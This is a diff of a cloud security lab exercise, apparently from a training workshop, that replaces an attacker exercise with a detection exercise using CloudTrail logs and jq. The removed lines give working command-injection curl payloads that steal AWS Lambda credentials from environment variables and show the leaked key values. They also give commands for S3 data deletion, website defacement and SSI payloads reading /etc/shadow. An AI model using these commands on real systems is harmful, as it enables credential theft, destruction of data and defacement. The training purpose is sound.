@@ -1,11 +1,11 @@
-# Exercise 4: Exploiting Evidence-App and Pivoting to Cloud Account
+# Exercise 4: Detecting the Attack
 
 <!-- markdownlint-disable MD033-->
 
 <!--Overriding style-->
 <style>
   :root {
-    --sans-primary-color: #ff0000;
+    --sans-primary-color: #0000ff;
 }
 </style>
 
@@ -13,304 +13,437 @@
 
 ## Objectives
 
-* Continue to use command injection to acquire **cloud credentials** used by AWS Lambda function
-* Discover what resources these newly-acquired credentials have access to
-* Destroy all evidence and deface evidence-app web page
-* Unset credential-related environment variables
+* Discover where the CloudTrail data is being written to within the `cloudlogs-` S3 bucket
+* Download just today's data to your CloudShell session
+* Analyze the data looking for all API calls made by the honey user (this is the basis of the detection and what will trigger the alert automation in Exercise 5)
 
 ## Challenges
 
-### Challenge 1: Steal Cloud Credentials From Lambda
+### Challenge 1: Discover CloudTrail Data Location
 
-When attempting to steal credentials from a system running in cloud, attackers may be drawn to hard-coded credentials like the `aws/credentials` file or interacting with a virtual machine's Instance Metadata Service (IMDS). This, however, is not quite how Lambda operates. When IAM roles are provisioned to Lambda function to allow them to interace with other cloud resources, you can find the credentials as environment variables:
-
-* `AWS_ACCESS_KEY_ID`
-* `AWS_SECRET_ACCESS_KEY`
-* `AWS_SESSION_TOKEN`
-
-Use your knowledge of how you can conduct command injection against this vulnerable application to acquire these three variable values which *should* give you some level of access into the greater cloud account. Once you have these values, set the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` values in your **CloudShell** session to become the Lambda role user.
+Using your CloudShell session, sift through your `cloudlogs-` S3 bucket to discover how the CloudTrail data is written to your S3 bucket. What kind of format is this data stored in?
 
 ??? cmd "Solution"
 
-    1. If you recall the output of the `fuzz_evidence_app.py` script, there was a sample `curl` command to perform command injection.
+    1. Re-open your CloudShell session if it has closed.
 
-        !!! summary "Sample Output"
+    2. Since you'll be crafting several commands targeting your S3 bucket, create an environment variable consisting of the bucket name called `LOGBUCKET` like so:
+
+        ```bash
+        export LOGBUCKET=$(aws s3api list-buckets --query \
+          "Buckets[? contains(Name,'cloudlogs-')].Name" --output text)
+        echo "The log bucket is: $LOGBUCKET"
+        ```
+
+        !!! summary "Sample result"
 
             ```bash
-            curl -X POST https://d3d7nz3kb2bgwk.cloudfront.net/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";id;","file_data":"dGVzdAo="}'
+            The log bucket is: cloudlogs-123456789010
             ```
 
-    2. You *could* run the script again, but here is the output (using `$TARGET` in place of the actual CloudFront URL):
+    3. Now, use the AWS CLI to view the root of that bucket.
 
         ```bash
-        curl -w '\n' -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
-          -d '{"file_name":";id;","file_data":"dGVzdAo="}'
+        aws s3 ls s3://$LOGBUCKET/
         ```
 
-    3. If you want to list a user's environment variables, it's quite easy in Linux using the `env` command. So try to replace `id` with `env`:
-
-        ```bash
-        curl -w '\n' -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
-          -d '{"file_name":";env;","file_data":"dGVzdAo="}'
-        ```
-
-        !!! summary "Expected Results"
+        !!! summary "Expected result"
 
             ```bash
-            {"message":"Internal Server Error"}
+                                       PRE AWSLogs/
             ```
-    
-    4. Hmm... that doesn't seem to work. But why? After hours of troubleshooting, we found that there is a limitation in the amount of bytes you can store in an AWS DynamoDB table (which is where the MD5 and SHA1 results are stored). Are we defeated? No! We just need to massage the command a bit to get the results we're after.
 
-    5. Try this command to limit the amount of characters returned by only matching lines that contain the variable names we're after:
+    4. Looks like just a single folder called `AWSLogs`. Now see what is in that folder.
 
         ```bash
-        curl -w '\n' -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
-          -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'
+        aws s3 ls s3://$LOGBUCKET/AWSLogs/
         ```
 
-        !!! summary "Expected Result"
+        !!! summary "Expected result"
 
             ```bash
-            Success
+                                       PRE 123456789010/
             ```
 
-    6. Now we're talking! But where are the results? If you remember, to acquire the file name, MD5, and SHA1 sum data, you send a `GET` to `/api/`.
+    5. Those contents should be a folder that match your AWS account number. Now see what is in that folder.
 
         ```bash
-        curl -w '\n' $TARGET/api/
+        export ACCTNUM=$(aws sts get-caller-identity --query Account --output text)
+        aws s3 ls s3://$LOGBUCKET/AWSLogs/$ACCTNUM/
         ```
 
-        !!! summary "Expected Results"
+        !!! summary "Expected result"
 
-            ```{'Items': [{'SHA1Sum': {'S': '3395856ce81f2b7382dee72602f798b642f14140'}, 'FileName': {'S': 'EICAR.txt'}, 'MD5Sum': {'S': '44d88612fea8a8f36de82e1278abb02f'}}, {'SHA1Sum': {'S': 'AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEN///////////wEaCXVzLWVhc3QtMSJIMEYCIQCp+vAnVIPFDDPnmECKacY61Rrqsc7emBdIvsoIWMF91QIhANYRB3Rw2DvJY4Sk3rMPrkNoxRLQZNwj9wanDMqabn86KuQCCBcQARoMMjA2NzU3ODIwMTUxIgw8aj1avqzdcqRlyKcqwQIzRvTMpjsD/ZTuJiJQmKfWJiQtfFNImrtKY91QiUQTfzIjoMW0633HrANTJvB8tYWKsV6FQHhhwVOn7D0WztlcgGNXf/NyMmHxshVvlu/ipDNUnTZkXPeNbs0syiTfXRqiMdkferK/EVQaosFdKDIhYMMrb+KqWpWdbxjIwir/Rb2ueizFpkshAc+r4q/kTZYHPpADJeIDoKhdhJmafEEG93jtb80EyJ/BKB2eyeCoehYShUo64JtI48iSGa7BlMexveuCwl0t8kjoVUVrRQjsTJ6sXc5h4uUznICf9H5Pr1Bcylc4XPRZPkntKdJpjJkhlOu41/CWVz+Da4JcAMMC3IBFKwYMjg6PRJ7fFLvCDzhVdAdtlPvhXUNBJ1Lh0Dm43GrZAcV6yGmT4iOSqoPrFqWTI/c+eTuRwt/++NhXtfMw5ZymlgY6nQH2dYiGn7F9mIxHufN4HmRqeCkiJjCjKKV0G+/4O49gH8zkq6uyz7gHjC9PAshYuw0HulttuYnsmI0gLQG0IgWJMDGWQtltXjcqyUPa7QOA7pRp1dx2wR7zp0twiedM4EVt9P93ZgKVZBKgH7OXd8UKKhJiJTq54tuOdwhEd6CKTofO0Vc9cBFj5ZZDrOPnmH4wis14yTkRz7VaLnTX\nAWS_SECRET_ACCESS_KEY=Ps/agCnAAHRLSSuqyJcufGPWlYvolaMTsmVMQrIR\nAWS_ACCESS_KEY_ID=ASIATAI5Z633ZFF2S7VT\n'}, 'FileName': {'S': ';env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"'}, 'MD5Sum': {'S': 'AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEN///////////wEaCXVzLWVhc3QtMSJIMEYCIQCp+vAnVIPFDDPnmECKacY61Rrqsc7emBdIvsoIWMF91QIhANYRB3Rw2DvJY4Sk3rMPrkNoxRLQZNwj9wanDMqabn86KuQCCBcQARoMMjA2NzU3ODIwMTUxIgw8aj1avqzdcqRlyKcqwQIzRvTMpjsD/ZTuJiJQmKfWJiQtfFNImrtKY91QiUQTfzIjoMW0633HrANTJvB8tYWKsV6FQHhhwVOn7D0WztlcgGNXf/NyMmHxshVvlu/ipDNUnTZkXPeNbs0syiTfXRqiMdkferK/EVQaosFdKDIhYMMrb+KqWpWdbxjIwir/Rb2ueizFpkshAc+r4q/kTZYHPpADJeIDoKhdhJmafEEG93jtb80EyJ/BKB2eyeCoehYShUo64JtI48iSGa7BlMexveuCwl0t8kjoVUVrRQjsTJ6sXc5h4uUznICf9H5Pr1Bcylc4XPRZPkntKdJpjJkhlOu41/CWVz+Da4JcAMMC3IBFKwYMjg6PRJ7fFLvCDzhVdAdtlPvhXUNBJ1Lh0Dm43GrZAcV6yGmT4iOSqoPrFqWTI/c+eTuRwt/++NhXtfMw5ZymlgY6nQH2dYiGn7F9mIxHufN4HmRqeCkiJjCjKKV0G+/4O49gH8zkq6uyz7gHjC9PAshYuw0HulttuYnsmI0gLQG0IgWJMDGWQtltXjcqyUPa7QOA7pRp1dx2wR7zp0twiedM4EVt9P93ZgKVZBKgH7OXd8UKKhJiJTq54tuOdwhEd6CKTofO0Vc9cBFj5ZZDrOPnmH4wis14yTkRz7VaLnTX\nAWS_SECRET_ACCESS_KEY=Ps/agCnAAHRLSSuqyJcufGPWlYvolaMTsmVMQrIR\nAWS_ACCESS_KEY_ID=ASIATAI5Z633ZFF2S7VT\n'}}, {'SHA1Sum': {'S': 'uid=993(sbx_user1051) gid=990 groups=990\n'}, 'FileName': {'S': ';id;'}, 'MD5Sum': {'S': 'uid=993(sbx_user1051) gid=990 groups=990\n'}}], 'Count': 3, 'ScannedCount': 3, 'ResponseMetadata': {'RequestId': 'I5QUGQR2NHDEOCGRUAHV0BLN1VVV4KQNSO5AEMVJF66Q9ASUAAJG', 'HTTPStatusCode': 200, 'HTTPHeaders': {'server': 'Server', 'date': 'Sat, 09 Jul 2022 14:26:43 GMT', 'content-type': 'application/x-amz-json-1.0', 'content-length': '2394', 'connection': 'keep-alive', 'x-amzn-requestid': 'I5QUGQR2NHDEOCGRUAHV0BLN1VVV4KQNSO5AEMVJF66Q9ASUAAJG', 'x-amz-crc32': '793005041'}, 'RetryAttempts': 0}}```
+            ```bash
+                                       PRE CloudTrail/
+            ```
 
-    7. It looks like we have credentials! You could use individual `export <VAR_NAME> <VAR_VALUE>` commands to set these credentials for use in your CloudShell session, but here is some Bash Kung Fu to do this for you:
+    6. Further down the rabbit hole, we found another folder called `CloudTrail`. Take a look inside.
 
         ```bash
-        export AWS_ACCESS_KEY_ID=$(curl -s $TARGET/api/ | egrep -o "AWS_ACCESS_KEY_ID=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2)
-        export AWS_SECRET_ACCESS_KEY=$(curl -s $TARGET/api/ | egrep -o "AWS_SECRET_ACCESS_KEY=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
-        export AWS_SESSION_TOKEN=$(curl -s $TARGET/api/ | egrep -o "AWS_SESSION_TOKEN=[a-zA-Z0-9/=+]*" | head -1 | cut -d '=' -f2,100)
+        aws s3 ls s3://$LOGBUCKET/AWSLogs/$ACCTNUM/CloudTrail
         ```
 
-### Challenge 2: Perform Discovery in Cloud Account
+        !!! summary "Sample result"
 
-Now that you are armed with credentials, see which account you compromised, get a lay of the land, and see which resource types you now have access to.
+            ```bash
+                                       PRE us-east-1/
+            2023-03-18 11:37:56          0
+            ```
+
+    7. In this folder, you probably found one or more other folders with names of a valid AWS region. Since we were performing our attacker behaviors in the `us-east-1` region, see what is in that folder.
+
+        ```bash
+        aws s3 ls s3://$LOGBUCKET/AWSLogs/$ACCTNUM/CloudTrail/us-east-1/
+        ```
+
+        !!! summary "Sample result"
+
+            ```bash
+                                       PRE 2023/
+            ```
+
+    8. The next folder down is the year. Now, you could repeat this a few more times, but we'll save you the trouble: under this folder is another folder with the number of the month (e.g., `03/`), then the day of the month (e.g., `18`), and then finally the CloudTrail data. To get to the data for today, here's a cheat:
+
+        ```bash
+        DATE=$(date +"%Y/%m/%d")
+        aws s3 ls s3://$LOGBUCKET/AWSLogs/$ACCTNUM/CloudTrail/us-east-1/$DATE/
+        ```
+
+        !!! summary "Sample result"
+
+            ```bash
+            2023-03-18 11:49:49       4536 123456789010_CloudTrail_us-east-1_20230318T1035Z_dksdeM5YJ305GQqr.json.gz
+            2023-03-18 11:44:06       1696 123456789010_CloudTrail_us-east-1_20230318T1145Z_hya7foJGvajqVkrL.json.gz
+            2023-03-18 11:49:17       1455 123456789010_CloudTrail_us-east-1_20230318T1150Z_HfyMXO29h8phuMgw.json.gz
+            2023-03-18 11:54:26       2574 123456789010_CloudTrail_us-east-1_20230318T1155Z_GzmUZDpzTamyk5q3.json.gz
+            2023-03-18 11:59:15        756 123456789010_CloudTrail_us-east-1_20230318T1155Z_l71CvCGGtNrtFQYd.json.gz
+            2023-03-18 11:59:37       2125 123456789010_CloudTrail_us-east-1_20230318T1200Z_XfRqC4uM9ZAmMPH7.json.gz
+            2023-03-18 12:07:06        666 123456789010_CloudTrail_us-east-1_20230318T1205Z_yOQrfO2eVslVrhHL.json.gz
+
+            <snip>
+            ```
+
+    9. As you can see, every 5 minutes or so, one or more GZIP-compressed JSON files are being created. This is the data we are interested in to discover our attacer's actions.
+
+### Challenge 2: Download Today's Management Events
+
+Now that you have the location of the CloudTrail data, download just today's data to your CloudShell session in a folder called `cloudtrail-logs` in your home directory.
 
 ??? cmd "Solution"
 
-    1. The first task is to determine who these credentials belong to. You can determine this quite easily by using the AWS CLI tools available in your **CloudShell** session. The first command you will use is:
+    1. Begin by creating a folder in your CloudShell session to store this data.
 
         ```bash
-        aws sts get-caller-identity
+        mkdir /home/cloudshell-user/cloudtrail-logs
         ```
 
-        !!! summary "Solution"
+        !!! summary "Expected result"
 
-            ```bash hl_lines="4"
-            {
-                "UserId": "AROATAI5Z633T7ULOW742:evidence",
-                "Account": "012345678910",
-                "Arn": "arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence"
-            }
-            ```
+            This command does not have output.
 
-    2. You have now verified that you stole credentials from a Lambda function. You also see the name of the role (`EvidenceLambdaRole`). Now, attempt to see which permissions this Lambda role may have by executing the following command:
+    2. Next, use the `aws s3 cp` command to download all of today's CloudTrail data.
 
         ```bash
-        aws iam list-attached-role-policies --role-name EvidenceLambdaRole
+        aws s3 cp s3://$LOGBUCKET/AWSLogs/$ACCTNUM/CloudTrail/us-east-1/$DATE/ \
+          /home/cloudshell-user/cloudtrail-logs --recursive
         ```
 
-        !!! summary "Expected Results"
-
-            ```An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence is not authorized to perform: iam:ListAttachedRolePolicies on resource: role EvidenceLambdaRole because no identity-based policy allows the iam:ListAttachedRolePolicies action```
-
-    3. This comes up empty as the role does not have rights to view its own permissions. The next logical step would be to try some of the more common AWS CLI commands that an attacker may try to gain access to critical or sensitive cloud resources.
-
-        ```bash
-        aws ec2 describe-instances
-        ```
-
-        !!! summary "Solution"
-
-            ```An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation.```
-
-        ```bash
-        aws rds describe-db-instances
-        ```
-
-        !!! summary "Solution"
-
-            ```An error occurred (AccessDenied) when calling the DescribeDBInstances operation: User: arn:aws:sts::012345678910:assumed-role/EvidenceLambdaRole/evidence is not authorized to perform: rds:DescribeDBInstances on resource: arn:aws:rds:us-east-1:012345678910:db:* because no identity-based policy allows the rds:DescribeDBInstances action```
-
-        ```bash
-        aws s3 ls
-        ```
-
-        !!! summary "Solution"
-
-            ```bash hl_lines="2 3"
-            2022-07-10 14:34:30 aws-logs-ev6hyhqiwb0duypb
-            2022-07-10 14:34:30 evidence-ev6hyhqiwb0duypb
-            2022-07-10 14:34:30 webcode-ev6hyhqiwb0duypb
-            ```
-
-    4. After some trial-and-error, you can see that you can utilize the `ListBuckets` API call with these stolen credentials. Set the `WEBCODE_BUCKET` and `EVIDENCE_BUCKET` environment variables to the names of the buckets beginning with `evidence-` and `webcode-`, respectively, as you will interact with these buckets a few times in the next challenge. Here is some Bash Kung Fu to do just that:
-
-        ```bash
-        EVIDENCE_BUCKET=$(aws s3 ls | egrep -o evidence-.*)
-        WEBCODE_BUCKET=$(aws s3 ls | egrep -o webcode-.*)
-        echo "The evidence bucket is: $EVIDENCE_BUCKET"
-        echo "The webcode bucket is:  $WEBCODE_BUCKET"
-        ```
-
-        !!! summary "Expected Results"
+        !!! summary "Sample results"
 
             ```bash
-            The evidence bucket is: evidence-ev6hyhqiwb0duypb
-            The webcode bucket is:  webcode-ev6hyhqiwb0duypb
+            download: s3://cloudlogs-123456789010/AWSLogs/123456789010/CloudTrail/us-east-1/2023/03/18/123456789010_CloudTrail_us-east-1_20230318T1150Z_HfyMXO29h8phuMgw.json.gz to cloudtrail-logs/123456789010_CloudTrail_us-east-1_20230318T1150Z_HfyMXO29h8phuMgw.json.gz
+            download: s3://cloudlogs-123456789010/AWSLogs/123456789010/CloudTrail/us-east-1/2023/03/18/123456789010_CloudTrail_us-east-1_20230318T1035Z_dksdeM5YJ305GQqr.json.gz to cloudtrail-logs/123456789010_CloudTrail_us-east-1_20230318T1035Z_dksdeM5YJ305GQqr.json.gz
+            download: s3://cloudlogs-123456789010/AWSLogs/123456789010/CloudTrail/us-east-1/2023/03/18/123456789010_CloudTrail_us-east-1_20230318T1155Z_GzmUZDpzTamyk5q3.json.gz to cloudtrail-logs/123456789010_CloudTrail_us-east-1_20230318T1155Z_GzmUZDpzTamyk5q3.json.gz
+            download: s3://cloudlogs-123456789010/AWSLogs/123456789010/CloudTrail/us-east-1/2023/03/18/123456789010_CloudTrail_us-east-1_20230318T1145Z_hya7foJGvajqVkrL.json.gz to cloudtrail-logs/123456789010_CloudTrail_us-east-1_20230318T1145Z_hya7foJGvajqVkrL.json.gz
+
+            <snip>
             ```
 
-### Challenge 3: Destruction and Defacement
+    3. Ensure that the data downloaded properly by reviewing the contents of the `/home/cloudshell-user/cloudtrail-logs` directory.
 
-One of the bucket names that you uncovered in the last challenge begins with the text `webcode-`. This is the static web content for the **evidence-app**. Normally, penetration tests may go the route of adding or modifying a single file to "prove the point" that unapproved and privileged access was achieved.
+        ```bash
+        ls /home/cloudshell-user/cloudtrail-logs
+        ```
 
-Since this is a development environment, you can create more "shock and awe". Delete all of the evidence from the from S3 and deface the **evidence-app** web page.
+        !!! summary "Sample results"
+
+            ```bash
+            123456789010_CloudTrail_us-east-1_20230318T1035Z_dksdeM5YJ305GQqr.json.gz
+            123456789010_CloudTrail_us-east-1_20230318T1145Z_hya7foJGvajqVkrL.json.gz
+            123456789010_CloudTrail_us-east-1_20230318T1150Z_HfyMXO29h8phuMgw.json.gz
+            123456789010_CloudTrail_us-east-1_20230318T1155Z_GzmUZDpzTamyk5q3.json.gz
+
+            <snip>
+            ```
+
+### Challenge 3: Detect Honey Token Usage
+
+Review the CloudTrail data looking for evidence of the `HoneyUser` user account performing actions in this AWS account and region.
 
 ??? cmd "Solution"
 
-    1. Since you have `ListBuckets` access, see if you can list the contents of the `evidence-` bucket to see the uploaded evidence files.
+    1. Let's start by looking at your downloaded data. Before that, we need to figure out how to get to the raw data. Since the data is GZIP-compressed, you could extract every one of these files, but there is a better way: using `zcat` to both extract and review the resulant data. View all file content in the `cloudtrail-logs` directory with `zcat`.
 
         ```bash
-        aws s3 ls s3://$EVIDENCE_BUCKET
+        zcat /home/cloudshell-user/cloudtrail-logs/*.json.gz
         ```
 
-        !!! summary "Expected Results"
+        !!! summary "Expected result"
 
-            ```bash
-                                       PRE &lt;!--#exec%20cmd=&quot;/
-                                       PRE /
-            2022-07-10 15:38:14          5 ;env;
-            2022-07-10 15:38:21          5 ;env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"
-            2022-07-10 15:37:39          5 ;id;
-            2022-07-10 15:37:12      94181 archer.png
-            ```
+            WAY TOO MUCH DATA TO SHOW HERE!
 
-    2. You can see a number of your exploit attempts! Let's clear the content of the bucket to do two things: cover our tracks a bit and cause the destruction of these legitimate files.
+    2. That data is quite a lot and is very hard to review manually. Luckily, there is a utility in CloudShell that can rescue you: `jq`. Use `jq` to both present the data in an easier-to-read format and also just view the first record of the first file to see the structure of the log data like so:
 
         ```bash
-        aws s3 rm s3://$EVIDENCE_BUCKET --recursive
+        zcat $(ls /home/cloudshell-user/cloudtrail-logs/*.json.gz | head -1) \
+         | jq '.Records[0]'
         ```
 
-        !!! summary "Expected Results"
-
-            ```bash
-            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-            delete: s3://evidence-pbk4g30a3h7nghii/;env;
-            delete: s3://evidence-pbk4g30a3h7nghii//index.html|id|
-            delete: s3://evidence-pbk4g30a3h7nghii/;env|egrep "(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)"
-            delete: s3://evidence-pbk4g30a3h7nghii/&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-            delete: s3://evidence-pbk4g30a3h7nghii/;id;
-            delete: s3://evidence-pbk4g30a3h7nghii/archer.png
-            ```
-
-    3. Verify that the bucket is now empty. If it is empty, the following command should not have any output:
-
-        ```bash
-        aws s3 ls s3://$EVIDENCE_BUCKET
-        ```
-
-    4. And now on to the defacement of the web page. Take a look at what is in the bucket beginning with `webcode-`.
-
-        ```bash
-        aws s3 ls s3://$WEBCODE_BUCKET
-        ```
-
-        !!! summary "Expected Results"
-
-            ```bash
-            2022-07-10 15:22:18     497556 Cloud_Ace_Final.png
-            2022-07-10 15:22:18         15 error.html
-            2022-07-10 15:22:18        318 favicon.ico
-            2022-07-10 15:25:51        935 index.html
-            2022-07-10 15:25:51       1547 script.js
-            2022-07-10 15:22:18        607 styles.css
-            ```
-
-    5. It appears that the static code for this application is set up in a similar structure to most web services:
-
-        * An `index.html` page for the homepage
-        * An `error.html` page for client request errors
-        * The SANS Cloud Ace image file (`Cloud_Ace_Final.png`)
-        * A `favicon.ico` file used for the web site icon
-        * A `styles.css` file for styling of the page
-        * A `script.js` file that we saw earlier for client-side processing
-
-    6. Generate a new `index.html` page to replace the legitimate one.
-
-        ```bash
-        cat << EOF > /tmp/index.html
-        <html>
-        <body>
-        <h1>Your evidence is gone!<br/>-Moriarty</h1>
-        </body>
-        </html>
-        EOF
-        ```
-
-    7. Upload this file to the root of the bucket beginning with `webcode-`.
-
-        ```bash
-        aws s3 cp /tmp/index.html s3://$WEBCODE_BUCKET/index.html
-        ```
-
-    8. Refresh the **evidence-app** homepage in your web browser to see the new content.
-
-        !!! note
-
-            If you closed this tab, you can see the evidence-app URL by running the following command in **CloudShell**:
-
-            ```bash
-            echo $TARGET
-            ```
-
-        ![](../img/exercise4/1.png ""){: class="w300" }
-
-### Challenge 4: Unset Environment Variables
-
-So that the next series of challenges are successful (you will be acting as a defender), unset the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` environment varibles so that your current IAM user's credentials are used.
-
-??? cmd "Solution"
-
-    1. In your **CloudShell** session, run the following commands to unset your AWS credential-related environment variables:
-
-        ```bash
-        unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
-        ```
-
-    2. Verify that you can still access AWS using the CLI tools and are the correct user.
-
-        ```bash
-        aws sts get-caller-identity
-        ```
-
-        !!! summary "Expected Results"
+        !!! summary "Sample results"
 
             ```bash
             {
-                "UserId": "012345678910",
-                "Account": "012345678910",
-                "Arn": "arn:aws:iam::012345678910:root"
+            "eventVersion": "1.08",
+            "userIdentity": {
+                "type": "AWSService",
+                "invokedBy": "cloudtrail.amazonaws.com"
+            },
+            "eventTime": "2023-03-18T10:30:51Z",
+            "eventSource": "s3.amazonaws.com",
+            "eventName": "GetBucketAcl",
+            "awsRegion": "us-east-1",
+            "sourceIPAddress": "cloudtrail.amazonaws.com",
+            "userAgent": "cloudtrail.amazonaws.com",
+            "requestParameters": {
+                "bucketName": "cloudlogs-123456789010",
+                "Host": "cloudlogs-123456789010.s3.us-east-1.amazonaws.com",
+                "acl": ""
+            },
+            "responseElements": null,
+            "additionalEventData": {
+                "SignatureVersion": "SigV4",
+                "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+                "bytesTransferredIn": 0,
+                "AuthenticationMethod": "AuthHeader",
+                "x-amz-id-2": "pMA3dNprLD8n9BXHH02Z+VIiUGqIWlpn1JNCXBn5dV4Blk7yQ83bz9qG9Qb2E/ljZfpU82mOb80=",
+                "bytesTransferredOut": 542
+            },
+            "requestID": "035F74YAQBE4N0B9",
+            "eventID": "82c10c51-1f5d-4de1-b729-4d0c3c45e0d4",
+            "readOnly": true,
+            "resources": [
+                {
+                "accountId": "123456789010",
+                "type": "AWS::S3::Bucket",
+                "ARN": "arn:aws:s3:::cloudlogs-123456789010"
+                }
+            ],
+            "eventType": "AwsApiCall",
+            "managementEvent": true,
+            "recipientAccountId": "123456789010",
+            "sharedEventID": "66965521-4adc-40f5-b23e-ccb05b66bbfb",
+            "eventCategory": "Management"
             }
             ```
 
-## ATT&CK
+    3. You may or may not have gotten a record related to an IAM user performing the action because CloudTrail events also record when cloud services and roles are performing activities. We can fix that by using `jq` to extract only those records that contain the `UserName` field. The command below will grab just the results from the first log file using the `select()` filtering option.
 
-MITRE ATT&CK techniques performed:
+        ```bash
+        zcat $(ls /home/cloudshell-user/cloudtrail-logs/*.json.gz | head -1) \
+         | jq -r '. | select(.Records[].userIdentity.userName != null)'
+        ```
 
-| Tactic            | Technique                                   | Description |
-|:------------------|:--------------------------------------------|:------------|
-| Credential Access | Unsecured Credentials (T1552)               | Stole credentials from AWS Lambda                      |
-| Impact            | Data Destruction (T1485)                    | Destroyed content in `evidence-*` bucket using AWS CLI |
-| Impact            | Defacement: External Defacement (T1491.002) | Defaced evidence-app homepage using AWS CLI            |
+        !!! summary "Sample result"
+
+            ```bash
+            <snip>
+
+            "eventTime": "2023-03-18T10:32:38Z",
+            "eventSource": "s3.amazonaws.com",
+            "eventName": "DeleteBucket",
+            "awsRegion": "us-east-1",
+            "sourceIPAddress": "35.168.12.107",
+            "userAgent": "[aws-cli/2.11.2 Python/3.11.2 Linux/4.14.255-305-242.531.amzn2.x86_64 exec-env/CloudShell exe/x86_64.amzn.2 prompt/off command/s3api.delete-bucket]",
+            "errorCode": "BucketNotEmpty",
+            "errorMessage": "The bucket you tried to delete is not empty",
+            "requestParameters": {
+                "bucketName": "cloudlogs-123456789010",
+                "Host": "cloudlogs-123456789010.s3.us-east-1.amazonaws.com"
+            },
+            "responseElements": null,
+            "additionalEventData": {
+                "SignatureVersion": "SigV4",
+                "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+                "bytesTransferredIn": 0,
+                "AuthenticationMethod": "AuthHeader",
+                "x-amz-id-2": "F3cV/R4LjoAVJ9WunDNQd3i65B6zd8TvIrLwfkeIzHYivBbTBnmpaZI+jsHVwAoFw7a+81cN/9A=",
+                "bytesTransferredOut": 322
+            },
+            "requestID": "19X7HQCD1567PZ1H",
+            "eventID": "1b5df64d-f43f-4a30-92c3-48b29ae4a1b4",
+            "readOnly": false,
+            "resources": [
+                {
+                "accountId": "123456789010",
+                "type": "AWS::S3::Bucket",
+                "ARN": "arn:aws:s3:::cloudlogs-123456789010"
+                }
+            ],
+            "eventType": "AwsApiCall",
+            "managementEvent": true,
+            "recipientAccountId": "123456789010",
+            "eventCategory": "Management",
+            "tlsDetails": {
+                "tlsVersion": "TLSv1.2",
+                "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+                "clientProvidedHostHeader": "cloudlogs-123456789010.s3.us-east-1.amazonaws.com"
+            }
+
+            <snip>
+            ```
+
+    4. Now to create a `jq` filter to pull out just the events related to the `HoneyUser` user. We will again use the `select() filter option, but check if the userName field is equal to `HoneyUser`. This command also review all GZIP-compress JSON files.
+
+        ```bash
+        zcat /home/cloudshell-user/cloudtrail-logs/*.json.gz  | \
+          jq -r '.Records[] | select(.userIdentity.userName == "HoneyUser")'
+        ```
+
+        !!! summary "Sample result"
+
+            ```bash
+            {
+                "eventVersion": "1.08",
+                "userIdentity": {
+                    "type": "IAMUser",
+                    "principalId": "AIDATAI5Z633QFORB2QCN",
+                    "arn": "arn:aws:iam::123456789010:user/HoneyUser",
+                    "accountId": "123456789010",
+                    "accessKeyId": "AKIATAI5Z6332LPA5KXG",
+                    "userName": "HoneyUser"
+                },
+                "eventTime": "2023-03-18T11:51:28Z",
+                "eventSource": "s3.amazonaws.com",
+                "eventName": "ListBuckets",
+                "awsRegion": "us-east-1",
+                "sourceIPAddress": "3.235.120.49",
+                "userAgent": "[aws-cli/2.11.2 Python/3.11.2 Linux/4.14.255-305-242.531.amzn2.x86_64 exec-env/CloudShell exe/x86_64.amzn.2 prompt/off command/s3api.list-buckets]",
+                "errorCode": "AccessDenied",
+                "errorMessage": "Access Denied",
+                "requestParameters": {
+                    "Host": "s3.us-east-1.amazonaws.com"
+                },
+                "responseElements": null,
+                "additionalEventData": {
+                    "SignatureVersion": "SigV4",
+                    "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+                    "bytesTransferredIn": 0,
+                    "AuthenticationMethod": "AuthHeader",
+                    "x-amz-id-2": "6m1fgCiEiGWEkphFcgjMD4eJb1BueFMChsExOhlxuO63+CYljg1tts8qwdzuUr5cgTVAHsRiIQE=",
+                    "bytesTransferredOut": 243
+                },
+                "requestID": "3BGZ96T71FHAD1AY",
+                "eventID": "40e7146f-f15b-455a-8b84-0fedabf086e1",
+                "readOnly": true,
+                "eventType": "AwsApiCall",
+                "managementEvent": true,
+                "recipientAccountId": "123456789010",
+                "eventCategory": "Management",
+                "tlsDetails": {
+                    "tlsVersion": "TLSv1.2",
+                    "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+                    "clientProvidedHostHeader": "s3.us-east-1.amazonaws.com"
+                }
+            }
+            {
+                "eventVersion": "1.08",
+                "userIdentity": {
+                    "type": "IAMUser",
+                    "principalId": "AIDATAI5Z633QFORB2QCN",
